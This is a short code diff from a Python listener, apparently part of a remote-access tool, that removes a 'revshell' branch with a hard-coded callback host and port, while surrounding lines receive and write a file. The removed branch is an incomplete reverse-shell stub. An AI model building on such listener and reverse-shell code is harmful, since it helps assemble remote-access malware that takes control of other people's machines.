@@ -95,12 +95,6 @@ def Listener():
                         l = conn.recv(1024)
                         if not l: break
                         f.write(l)
-            elif Handler == "revshell":
-                conn.send(Handler.encode("utf-8"))
-                lhost = "192.168.1.107"
-                lport = 4434
-                while True:
-                    conn.recv(1024)
 
 
 
